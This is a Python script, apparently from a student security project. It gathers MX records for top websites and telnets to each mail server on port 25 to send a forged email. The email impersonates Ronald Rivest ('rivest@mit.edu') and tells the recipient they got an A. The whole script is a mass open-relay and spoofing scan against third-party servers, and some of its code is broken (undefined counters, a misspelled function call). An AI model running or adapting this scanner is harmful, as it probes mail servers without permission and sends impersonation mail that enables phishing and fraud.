import dns.resolver
import sys
import telnetlib
import csv

def find_mailservs():
	with open('topmill.csv', 'rb') as csvfile:
		reader = csv.reader(csvfile, delimiter=',')
		for row in reader:
			top_million = row[:-1]
			for website in top_million:
				i += 1
				print 'website #', i
				mail_server = find_mx(website)

def find_mx(website):
	try:
		result = dns.resolver.query(website, 'MX')
		f = open('mailservers.csv','a')
		for x in result:
			f.write(x.to_text().split()[1]+',')
		f.close()
	except:
		n += 1
		print n, " No answer"
	
def do_telnet():
	with open('mailservers.csv','rb') as csvfile:
		i = 0
		reader = csv.reader(csvfile, delimiter=',')
		for row in reader:
			for mail_server in row:
				i += 1
				print i," pinging ", mail_server
				ping_mx_server(mail_server)

def ping_mx_server(mail_server):
	sender = 'rivest@mit.edu'
	#receiver = '<spoofing_sucker@yahoo.com>'
	receiver = 'spoofing_sucker@yahoo.com'
	try:
		tn = telnetlib.Telnet(mail_server,25,5)
		# telnet with mailserv
		tn.write("helo "+mail_server+"\r\n")
		print tn.expect(['.+'])
		tn.write('mail from: <'+sender+'>\r\n')
		print tn.expect(['.+'])
		tn.write('rcpt to: <'+receiver+'>\r\n')
		# could return OK, or return error because outside domain
		# if there's an error we could test again with an inside-domain email, but not send it
		print tn.expect(['.+'])
		tn.write('data\r\n')
		print tn.expect(['.+'])
		tn.write('To: Bob BitDiddle <'+receiver+'>\r\n')
		tn.write('From: Ronald Rivest <'+sender+'>\r\n')
		tn.write('Reply- To: '+sender+'\r\n')
		tn.write('Subject: I am spoofing you, because security.\r\n\r\n')
		tn.write('You got an A in my class, congrats!\r\nBest,\r\nRivest\r\n')
		tn.write('\r\n\r\n.\r\n')
		print tn.expect(['.+'])
		print tn.expect(['.+'])
		print 'done, quitting'
		# terminate
		tn.write("quit")
		tn.close()
	except:
		print 'server refused connection'


def log_result():
	print 'undefined'

if __name__ == "__main__":
	# find_mailsers()
	do_telnet()